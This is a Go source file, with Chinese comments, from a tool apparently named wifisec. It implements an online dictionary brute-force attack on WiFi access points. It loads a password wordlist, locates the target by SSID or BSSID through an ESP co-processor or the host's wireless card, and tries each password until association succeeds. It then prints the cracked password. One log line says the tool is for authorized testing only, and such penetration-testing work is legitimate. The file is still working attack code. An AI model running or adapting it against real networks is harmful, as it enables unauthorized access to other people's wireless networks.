package functions

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strings"
	"time"

	platformassoc "github.com/ctkqiang/wifisec/internal/platform/assoc"
	platformesp "github.com/ctkqiang/wifisec/internal/platform/esp"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

// associator 是爆破执行器的最小抽象：ESP 协处理器与各平台本机网卡
// 都收敛到同一个签名，爆破主循环不感知底层走哪条路径。
type associator interface {
	Associate(ssid, password string) (bool, error)
}

// BruteForceConnectToWiFi 对目标 AP 进行在线密码字典爆破。
// 用法：wifisec brute <ssid|bssid> with-pass: <字典文件> [串口]
//
// 执行路径自动选择：插入 ESP 时走协处理器（不碰本机网络配置）；
// 无设备时回落本机无线网卡（macOS networksetup / Linux nmcli /
// Windows netsh），代价是爆破期间本机 WiFi 反复断开重连。
//
// 在线破解的固有局限（启动时向用户说明）：
//   - 每次尝试需 2-5 秒（AP 应答失败的时间），大字典耗时长
//   - 现代 AP 常在 3-5 次失败后限速或临时锁定 STA，触发后后续尝试全部超时
//   - WPA3 的 SAE 握手对在线爆破更不友好，成功率低于 WPA2
//
// 离线握手破解（aircrack 路线）需固件支持 monitor 抓包，当前未实现。
func BruteForceConnectToWiFi(args []string) error {
	target, targetMAC, wordlistPath, portName, err := parseBruteArgs(args)
	if err != nil {
		return err
	}

	passwords, err := loadWordlist(wordlistPath)
	if err != nil {
		return err
	}

	utilities.Info("字典 %s 加载完成：%d 个候选密码", wordlistPath, len(passwords))
	if len(passwords) == 0 {
		return errors.New("字典文件为空，无密码可尝试")
	}

	assocSvc, ssid, bssid, closer, err := openAssociator(portName, target, targetMAC)
	if err != nil {
		return err
	}
	if closer != nil {
		defer closer.Close()
	}

	utilities.Info("目标锁定：SSID %q", ssid)
	utilities.Warn("在线爆破模式：每次尝试约 2-5 秒，AP 可能在多次失败后限速；仅用于授权测试")

	started := time.Now()
	for idx, pass := range passwords {
		attemptStart := time.Now()
		ok, err := assocSvc.Associate(ssid, pass)
		took := time.Since(attemptStart).Round(100 * time.Millisecond)
		if err != nil {
			utilities.Warn("[%d/%d] 尝试 %q 出错（%s）：%v", idx+1, len(passwords), pass, took, err)
			continue
		}

		if ok {
			// BSSID 补全：ESP 路径来自扫描结果；本机路径命中后
			// 尽力回查当前连接的 BSSID，查不到如实标注。
			if bssid == "" {
				if d, ok := assocSvc.(interface{ ConnectedBSSID(string) string }); ok {
					bssid = d.ConnectedBSSID(ssid)
				}
			}
			if bssid == "" {
				bssid = "未知（系统隐藏，macOS 需定位授权）"
			}

			elapsed := time.Since(started).Round(time.Second)
			lines := []string{
				"════════════ 爆破成功 ════════════",
				fmt.Sprintf("  SSID   : %s", ssid),
				fmt.Sprintf("  BSSID  : %s", bssid),
				fmt.Sprintf("  密码   : %s", pass),
				fmt.Sprintf("  尝试   : %d/%d · 总耗时 %s", idx+1, len(passwords), elapsed),
				"═══════════════════════════════════",
			}
			utilities.Info("\n%s", strings.Join(lines, "\n"))
			return nil
		}

		utilities.Info("[%d/%d] 失败：%q（%s）", idx+1, len(passwords), pass, took)
	}

	utilities.Warn("字典遍历完毕，未找到正确密码（共 %d 个候选 · 耗时 %s）",
		len(passwords), time.Since(started).Round(time.Second))
	return nil
}

// openAssociator 选择爆破执行路径。优先 ESP 协处理器：关联尝试跑在
// 板载射频上，不污染宿主机网络配置；未检测到设备时回落本机网卡。
// 返回的 bssid 来自扫描结果（ESP 路径），本机路径为空串、命中后回查；
// closer 仅 ESP 路径非 nil（本机网卡无资源需释放）。
func openAssociator(portName, target string, targetMAC net.HardwareAddr) (associator, string, string, io.Closer, error) {
	if portName == "" {
		if p, err := platformesp.DefaultPort(); err == nil {
			portName = p
		}
	}

	if portName != "" {
		utilities.Info("连接 %s，等待固件就绪…", portName)
		injector, err := platformesp.Open(portName)
		if err != nil {
			return nil, "", "", nil, err
		}

		utilities.Info("协处理器就绪（协议 v%d），扫描周边网络定位目标…", injector.FirmwareVersion())
		scanned, err := injector.Scan()
		if err != nil {
			injector.Close()
			return nil, "", "", nil, fmt.Errorf("扫描失败：%w", err)
		}
		ssid, bssid := resolveTargetSSID(scanned, target, targetMAC)
		if ssid == "" {
			injector.Close()
			return nil, "", "", nil, fmt.Errorf("未找到目标 %s, 请确认 SSID/BSSID 正确且目标在信号范围内", target)
		}
		return injector, ssid, bssid, injector, nil
	}

	// 本机网卡路径：关联由系统网络栈完成，无法按 BSSID 反查 SSID
	// （扫描同样依赖 ESP 或定位权限），仅接受 SSID 目标。
	if targetMAC != nil {
		return nil, "", "", nil, errors.New("本机网卡路径仅支持按 SSID 爆破；请改用 SSID，或插入 ESP 协处理器按 BSSID 锁定")
	}
	native, err := platformassoc.NewNative()
	if err != nil {
		return nil, "", "", nil, err
	}
	utilities.Warn("未检测到 ESP 协处理器，回落到本机无线网卡（%s）", runtime.GOOS)
	utilities.Warn("爆破期间本机 WiFi 会反复断开重连，当前网络连接将不可用")
	return native, target, "", nil, nil
}

// parseBruteArgs 解析 brute 子命令参数。
// 支持两种等价写法：
//
//	wifisec brute <ssid|bssid> with-pass: <file> [串口]
//	wifisec brute <ssid|bssid> <file> [串口]
//
// with-pass: 关键字可带或不带尾部冒号，匹配时大小写不敏感。
func parseBruteArgs(args []string) (target string, targetMAC net.HardwareAddr, wordlistPath, portName string, err error) {
	if len(args) < 2 {
		err = errors.New("用法：wifisec brute <ssid|bssid> with-pass: <字典文件> [串口]")
		return
	}

	target = strings.TrimSpace(args[0])
	if target == "" {
		err = errors.New("目标 SSID/BSSID 不能为空")
		return
	}

	// 判定目标是 BSSID 还是 SSID；解析失败视为 SSID。
	targetMAC, err = net.ParseMAC(target)
	if err != nil {
		targetMAC = nil
		err = nil
	}

	// 定位字典文件路径：跳过 with-pass 关键字后取第一个非空参数。
	var rest []string
	for i := 1; i < len(args); i++ {
		token := strings.TrimSpace(args[i])
		if token == "" {
			continue
		}
		lower := strings.ToLower(token)
		if lower == "with-pass" || lower == "with-pass:" {
			continue
		}
		rest = append(rest, token)
	}

	if len(rest) < 1 {
		err = errors.New(
			"缺少字典文件参数; 用法: wifisec brute <ssid|bssid> with-pass: <字典文件>",
		)

		return
	}

	wordlistPath = rest[0]
	if len(rest) > 1 {
		portName = rest[1]
	}

	return target, targetMAC, wordlistPath, portName, nil
}

// loadWordlist 逐行读取密码字典，去空白行、去首尾空白、跳过注释（# 开头）。
// 不去重：字典可能有意重复以测试 AP 的失败计数策略，保持原始顺序与频次。
func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("打开字典文件 %s 失败：%w", path, err)
	}
	defer f.Close()

	var passwords []string
	scanner := bufio.NewScanner(f)
	// 单行密码理论上没有长度上限，WiFi WPA 密码最长 63 字节，
	// 64KB 缓冲足以覆盖任何合理字典条目。
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		passwords = append(passwords, line)
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("读取字典文件失败：%w", err)
	}

	return passwords, nil
}

// resolveTargetSSID 在扫描结果中定位目标，返回用于关联的 SSID 与命中
// AP 的 BSSID。目标是 BSSID 时反查对应 SSID；目标是 SSID 时原样返回
// （需存在于扫描结果中）。同名 SSID 多 AP 场景下取第一个即可——关联
// 尝试由固件按 SSID 发起，不绑定具体 BSSID，AP 侧会自行选择接入的 STA。
func resolveTargetSSID(scanned []platformesp.Network, target string, targetMAC net.HardwareAddr) (ssid, bssid string) {
	if targetMAC != nil {
		for _, ap := range scanned {
			if strings.EqualFold(ap.BSSID, targetMAC.String()) {
				return ap.SSID, ap.BSSID
			}
		}
		return "", ""
	}

	for _, ap := range scanned {
		if ap.SSID == target {
			return ap.SSID, ap.BSSID
		}
	}
	return "", ""
}
